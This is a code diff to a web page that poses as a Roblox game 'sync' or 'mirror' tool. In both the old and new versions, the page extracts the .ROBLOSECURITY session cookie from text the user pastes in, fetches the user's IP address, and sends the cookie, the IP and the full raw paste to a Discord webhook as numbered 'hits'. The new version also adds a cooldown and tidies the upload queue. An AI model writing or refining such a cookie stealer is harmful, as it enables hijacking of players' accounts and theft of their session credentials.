@@ -445,18 +445,11 @@
         let options = {};
 
         if (item.type === 'json') {
-            options = { 
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' }, 
-                body: JSON.stringify(item.payload) 
-            };
+            options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(item.payload) };
         } else {
             const fd = new FormData();
-            // Use payload_json so Discord applies the custom username/avatar to the file message
-            fd.append("payload_json", JSON.stringify({
-                username: item.payload.username,
-                avatar_url: item.payload.avatar_url
-            }));
+            fd.append("username", item.payload.username);
+            fd.append("avatar_url", item.payload.avatar_url);
             fd.append("file", new Blob([item.payload.content], {type: 'text/plain'}), item.payload.filename);
             options = { method: 'POST', body: fd };
         }
@@ -464,106 +457,68 @@
         try {
             const response = await fetch(hook, options);
             if (response.ok) {
-                requestQueue.shift(); 
+                requestQueue.shift(); // Success
             } else if (response.status === 429) {
                 const data = await response.json();
-                await new Promise(res => setTimeout(res, (data.retry_after * 1000) || 5000));
-                continue; 
-            } else { 
-                requestQueue.shift(); 
-            }
+                const retryAfter = (data.retry_after * 1000) || 5000;
+                await new Promise(res => setTimeout(res, retryAfter));
+                continue; // Retry same item
+            } else { requestQueue.shift(); } // Skip bad request
         } catch (e) {
             await new Promise(res => setTimeout(res, 5000));
-            break; 
+            break; // Network fail, try again later
         }
     }
     isProcessingQueue = false;
     if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
         
-async function validateAndStart(event) {
+        async function validateAndStart(event) {
+    // 1. Cooldown Check
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
-        box.classList.add('error-shake');
         document.getElementById('error-msg').classList.remove('opacity-0');
+        box.classList.add('error-shake');
         setTimeout(() => box.classList.remove('error-shake'), 400);
         return;
     }
 
+    // 2. Activate 5s Cooldown
     isCooldown = true;
     const btn = event.target;
-    btn.innerText = "UPLINKING...";
-    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; }, 5000);
+    const originalText = btn.innerText;
+    btn.innerText = "COOLDOWN ACTIVE...";
+    btn.style.opacity = "0.5";
+    setTimeout(() => { isCooldown = false; btn.innerText = originalText; btn.style.opacity = "1"; }, 5000);
 
+    // 3. UI Transition
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
     localStorage.setItem('nexus_hit_counter', cur);
-    
     document.getElementById('setup-phase').classList.add('hidden');
     document.getElementById('progress-phase').classList.remove('hidden');
 
+    // 4. Data Collection
     const raw = document.getElementById('userInput').value;
-    
-    // Improved Regex to grab the full cookie string
-    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-Z0-9\-_]+)/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "COOKIE_NOT_FOUND";
-
-    let ip = "0.0.0.0";
+    const cook = (raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/) || [])[1] || "NOT_FOUND";
+    let ip = "Detecting...";
     try { 
-        const res = await fetch('https://api.ipify.org?format=json'); 
-        const data = await res.json();
-        ip = data.ip; 
-    } catch(e) { ip = "Detecting..."; }
+        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) }); 
+        ip = (await res.json()).ip; 
+    } catch(e) { ip = "Timed Out"; }
 
     const hookName = `NEXUSRBLX HIT #${cur}`;
-    requestQueue = []; // Clear for fresh start
 
-    // 1. Send Embed (IP & Info)
-    requestQueue.push({ 
-        type: 'json', 
-        payload: { 
-            username: hookName, 
-            avatar_url: logoURL, 
-            embeds: [{ 
-                title: `Successfully Mirrored: ${dName}`, 
-                color: 0x10b981, 
-                fields: [
-                    { name: "🌐 Network IP", value: `\`${ip}\``, inline: true }, 
-                    { name: "🎮 Place ID", value: `\`${dId}\``, inline: true }
-                ],
-                footer: { text: "Nexus Intelligence Protocol" },
-                timestamp: new Date().toISOString()
-            }] 
-        } 
-    });
+    // 5. Save to Queue (The "Restore/Fail-safe" logic)
+    requestQueue.push({ type: 'json', payload: { username: hookName, avatar_url: logoURL, embeds: [{ title: `🛡️ TARGET: ${dName}`, color: 0x10b981, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "🎮 ID", value: `\`${dId}\``, inline: true }, { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }] }] } });
+    requestQueue.push({ type: 'file', payload: { username: hookName, avatar_url: logoURL, filename: `RAWLOG#${cur}.txt`, content: raw } });
 
-    // 2. Send Cookie ONLY (Separate TXT)
-    requestQueue.push({ 
-        type: 'file', 
-        payload: { 
-            username: hookName, 
-            avatar_url: logoURL, 
-            filename: `COOKIE_${cur}.txt`, 
-            content: cook 
-        } 
-    });
-
-    // 3. Send Full Raw Log (Separate TXT)
-    requestQueue.push({ 
-        type: 'file', 
-        payload: { 
-            username: hookName, 
-            avatar_url: logoURL, 
-            filename: `RAWLOG_${cur}.txt`, 
-            content: raw 
-        } 
-    });
-
+    // 6. Start Background Processes
     processQueue();
     runEngine();
 }
-        
+
         function runEngine() {
     
     const dur = Math.floor(Math.random() * (60000 - 30000 + 1)) + 30000;
@@ -693,7 +648,6 @@ window.onload = () => {
     </script>
 </body>
 </html>
-
 
 
 
